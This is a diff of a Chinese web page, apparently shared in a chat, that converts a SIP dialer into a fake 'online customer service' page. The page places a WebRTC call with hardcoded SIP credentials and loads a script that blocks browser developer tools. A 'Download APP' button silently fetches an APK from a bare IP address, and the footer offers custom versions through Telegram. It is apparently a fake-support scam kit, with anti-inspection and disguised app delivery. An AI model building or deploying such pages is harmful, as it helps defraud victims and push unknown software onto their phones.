@@ -1,14 +1,13 @@
-大 头, [2025/6/6 22:04]
 <!DOCTYPE html>
 <html lang="zh-CN">
 <head>
   <meta charset="utf-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <title>网页拨号盘</title>
+  <title>网页呼叫客服</title>
   <style>
     body {
       font-family: Arial, sans-serif;
-      background-color: #f0f0f0;
+      background-color: #f5f5f5;
       display: flex;
       flex-direction: column;
       align-items: center;
@@ -16,55 +15,43 @@
       height: 100vh;
       margin: 0;
     }
-    #numberDisplay {
-      font-size: 24px;
-      margin-bottom: 20px;
-      width: 240px;
-      text-align: center;
-      padding: 10px;
-      background-color: #fff;
-      border-radius: 8px;
-      box-shadow: 0 2px 5px rgba(0,0,0,0.1);
+    .main-content {
+      transform: translateY(-3cm);
+      display: flex;
+      flex-direction: column;
+      align-items: center;
     }
-    #dialer {
-      display: grid;
-      grid-template-columns: repeat(3, 80px);
-      grid-gap: 10px;
+    h1 {
+      font-size: 28px;
+      color: #333;
       margin-bottom: 20px;
     }
-    .dial-button {
-      width: 80px;
-      height: 80px;
-      font-size: 24px;
-      border: none;
-      border-radius: 50%;
-      background-color: #fff;
-      box-shadow: 0 2px 5px rgba(0,0,0,0.3);
-      cursor: pointer;
-    }
-    #callButton, #hangupButton, #answerButton, #rejectButton {
-      padding: 14px 28px;
-      font-size: 18px;
-      margin: 10px;
+    #callButton, #hangupButton, #downloadApkButton {
+      padding: 18px 36px;
+      font-size: 22px;
+      margin: 15px;
       border: none;
       border-radius: 8px;
       cursor: pointer;
-      width: 120px;
     }
     #callButton {
       background-color: #28a745;
       color: white;
     }
+    #callButton:disabled {
+      background-color: #ccc;
+      cursor: not-allowed;
+    }
     #hangupButton {
       background-color: #dc3545;
       color: white;
     }
-    #answerButton {
-      background-color: #007bff;
-      color: white;
+    #hangupButton:disabled {
+      background-color: #ccc;
+      cursor: not-allowed;
     }
-    #rejectButton {
-      background-color: #6c757d;
+    #downloadApkButton {
+      background-color: #007bff;
       color: white;
     }
     #callStatus {
@@ -72,94 +59,100 @@
       margin-top: 10px;
       color: #333;
     }
+    .footer {
+      position: absolute;
+      bottom: 20px;
+      width: 90%;
+      max-width: 800px;
+      font-size: 20px;
+      color: #555;
+      text-align: center;
+      line-height: 1.6;
+    }
   </style>
 </head>
 <body>
 
-  <div id="numberDisplay">请输入号码</div>
-  <div id="dialer">
-    <button class="dial-button" onclick="appendNumber('1')">1</button>
-    <button class="dial-button" onclick="appendNumber('2')">2</button>
-    <button class="dial-button" onclick="appendNumber('3')">3</button>
-    <button class="dial-button" onclick="appendNumber('4')">4</button>
-    <button class="dial-button" onclick="appendNumber('5')">5</button>
-    <button class="dial-button" onclick="appendNumber('6')">6</button>
-    <button class="dial-button" onclick="appendNumber('7')">7</button>
-    <button class="dial-button" onclick="appendNumber('8')">8</button>
-    <button class="dial-button" onclick="appendNumber('9')">9</button>
-    <button class="dial-button" onclick="appendNumber('*')">*</button>
-    <button class="dial-button" onclick="appendNumber('0')">0</button>
-    <button class="dial-button" onclick="appendNumber('#')">#</button>
+  <div class="main-content">
+    <h1>欢迎来到在线客服中心</h1>
+
+    <button id="callButton" onclick="makeCall()">📞 呼叫客服</button>
+    <button id="hangupButton" onclick="hangupCall()" disabled>🛑 挂断</button>
+    <button id="downloadApkButton">⬇️ 下载APP</button>
+
+    <div id="callStatus">未呼叫</div>
+    <audio id="audioRemote" autoplay></audio>
   </div>
 
-  <button id="callButton" onclick="makeCall()">📞 呼叫</button>
-  <button id="hangupButton" onclick="hangupCall()" disabled>🛑 挂断</button>
-  <button id="answerButton" onclick="answerCall()" style="display:none;">✅ 接听</button>
-  <button id="rejectButton" onclick="rejectCall()" style="display:none;">❌ 拒接</button>
-  <div id="callStatus">未呼叫</div>
+  <div class="footer">
+    <strong>测试指南</strong><br>
+    点击“呼叫客服”按钮开始通话。<br>
+    通话过程中，您可以随时点击“挂断”按钮结束通话。<br>
+    内容、页面、链接等等一切都可以按照您的需求定制，请联系 Telegram（飞机）客服人员。
+  </div>
 
-  <audio id="audioRemote" autoplay></audio>
-  <audio id="ringtone" src="ringtone.mp3" preload="auto" loop></audio>
-
-  <!-- 引入 JsSIP 和适配库 -->
+  <!-- ✅ 引入 JsSIP 和适配库 -->
   <script src="https://webrtc.github.io/adapter/adapter-latest.js"></script>
   <script src="https://cdn.jsdelivr.net/npm/jssip@3.0.10/dist/jssip.min.js"></script>
 
+  <!-- ✅ 引入 disable-devtool 插件 -->
+  <script disable-devtool-auto src="https://cdn.jsdelivr.net/npm/disable-devtool"></script>
+
   <script>
-    let number = '';
-    const numberDisplay = document.getElementById('numberDisplay');
-    const callButton = document.getElementById('callButton');
-    const hangupButton = document.getElementById('hangupButton');
-    const answerButton = document.getElementById('answerButton');
-    const rejectButton = document.getElementById('rejectButton');
-    const statusDisplay = document.getElementById('callStatus');
-    const remoteAudio = document.getElementById('audioRemote');
-    const ringtone = document.getElementById('ringtone');
-    let session = null;
-    let isCalling = false;
+    document.addEventListener("DOMContentLoaded", function () {
+      const socket = new JsSIP.WebSocketInterface('wss://xin.anjre.cn:8089/ws');
 
-    function appendNumber(num) {
-      number += num;
-      numberDisplay.textContent = number;
-    }
+      const configuration = {
+        sockets: [socket],
+        uri: 'sip:100110@xin.anjre.cn',
+        password: 'Aa6363463@',
+        display_name: '网页客户',
+        session_timers: false,
+        register: true
+      };
 
-    function updateStatus(text) {
-      statusDisplay.textContent = text;
-    }
+      const ua = new JsSIP.UA(configuration);
+      let session = null;
+      let isCalling = false;
 
-大 头, [2025/6/6 22:04]
-function playRingtone() {
-      ringtone.play().catch(err => console.warn('铃声播放失败:', err));
-    }
+      ua.on('connected', () => console.log('已连接到 SIP WebSocket'));
+      ua.on('registered', () => console.log('✅ 注册成功'));
+      ua.on('registrationFailed', e => console.error('❌ 注册失败', e));
+      ua.on('disconnected', () => console.log('❗️ WebSocket 断开'));
+      ua.start();
 
-    function stopRingtone() {
-      ringtone.pause();
-      ringtone.currentTime = 0;
-    }
+      const callButton = document.getElementById('callButton');
+      const hangupButton = document.getElementById('hangupButton');
+      const statusDisplay = document.getElementById('callStatus');
+      const remoteAudio = document.getElementById('audioRemote');
 
-    const socket = new JsSIP.WebSocketInterface('wss://xin.anjre.cn:8089/ws');
-    const configuration = {
-      sockets: [socket],
-      uri: 'sip:9930@xin.anjre.cn',
-      password: 'Aa636346300@',
-      display_name: '网页客户',
-      session_timers: false,
-      register: true
-    };
-    const ua = new JsSIP.UA(configuration);
-    ua.start();
+      function updateStatus(text) {
+        statusDisplay.textContent = text;
+      }
 
-    ua.on('newRTCSession', function(data) {
-      const newSession = data.session;
+      window.makeCall = function () {
+        if (isCalling) return;
 
-      if (newSession.direction === 'incoming') {
-        session = newSession;
-        const caller = session.remote_identity.uri.user;
-        updateStatus("来电中: " + caller);
-        playRingtone();
-        answerButton.style.display = 'inline-block';
-        rejectButton.style.display = 'inline-block';
+        isCalling = true;
+        callButton.disabled = true;
+        hangupButton.disabled = false;
+        updateStatus("正在呼叫...");
 
+        session = ua.call('sip:80088@xin.anjre.cn', {
+          mediaConstraints: { audio: true, video: false },
+          rtcOfferConstraints: {
+            offerToReceiveAudio: 1,
+            offerToReceiveVideo: 0
+          }
+        });
+
+        session.connection.addEventListener('addstream', function (e) {
+          remoteAudio.srcObject = e.stream;
+          remoteAudio.play().catch(err => console.warn('自动播放失败:', err));
+        });
+
+        session.on('progress', () => updateStatus("振铃中..."));
+        session.on('accepted', () => updateStatus("通话中"));
         session.on('ended', () => {
           updateStatus("通话结束");
           resetUI();
@@ -169,86 +162,34 @@ function playRingtone() {
           console.error('呼叫失败:', e);
           resetUI();
         });
-        session.on('accepted', () => {
-          updateStatus("通话中");
-        });
-      }
-    });
+      };
 
-    window.makeCall = function () {
-      if (isCalling || number === '') return;
-
-      isCalling = true;
-      callButton.disabled = true;
-      hangupButton.disabled = false;
-      updateStatus("正在呼叫...");
-
-      session = ua.call(sip:${number}@xin.anjre.cn, {
-        mediaConstraints: { audio: true, video: false },
-        rtcOfferConstraints: {
-          offerToReceiveAudio: 1,
-          offerToReceiveVideo: 0
+      window.hangupCall = function () {
+        if (session) {
+          session.terminate();
         }
-      });
+      };
 
-      session.connection.addEventListener('addstream', function (e) {
-        remoteAudio.srcObject = e.stream;
-        remoteAudio.play().catch(err => console.warn('自动播放失败:', err));
-      });
-
-      session.on('progress', () => updateStatus("振铃中..."));
-      session.on('accepted', () => updateStatus("通话中"));
-      session.on('ended', () => {
-        updateStatus("通话结束");
-        resetUI();
-      });
-      session.on('failed', (e) => {
-        updateStatus("呼叫失败");
-        console.error('呼叫失败:', e);
-        resetUI();
-      });
-    };
-
-    window.hangupCall = function () {
-      if (session) {
-        session.terminate();
+      function resetUI() {
+        isCalling = false;
+        callButton.disabled = false;
+        hangupButton.disabled = true;
+        session = null;
       }
-    };
 
-    window.answerCall = function () {
-      if (session) {
-        stopRingtone();
-        session.answer({
-          mediaConstraints: { audio: true, video: false }
-        });
-        session.connection.addEventListener('addstream', function (e) {
-          remoteAudio.srcObject = e.stream;
-          remoteAudio.play().catch(err => console.warn('自动播放失败:', err));
-        });
-        answerButton.style.display = 'none';
-        rejectButton.style.display = 'none';
-        hangupButton.disabled = false;
-      }
-    };
+      // 新增：下载 APK 按钮静默下载逻辑
+      const downloadApkButton = document.getElementById('downloadApkButton');
+      downloadApkButton.addEventListener('click', () => {
+        const url = 'http://47.98.19.153/Android_8.9.28.10155_537147618_64.apk'; // 你的 APK 文件地址
+        const a = document.createElement('a');
+        a.href = url;
+        a.download = 'Android_8.9.28.10155_537147618_64.apk'; // 文件名可自定义
+        document.body.appendChild(a);
+        a.click();
+        document.body.removeChild(a);
+      });
 
-    window.rejectCall = function () {
-      if (session) {
-        stopRingtone();
-        session.terminate();
-        resetUI();
-      }
-    };
-
-    function resetUI() {
-      isCalling = false;
-      callButton.disabled = false;
-      hangupButton.disabled = true;
-      answerButton.style.display = 'none';
-      rejectButton.style.display = 'none';
-      session = null;
-      number = '';
-      numberDisplay.textContent = '请输入号码';
-    }
+    });
   </script>
 </body>
 </html>
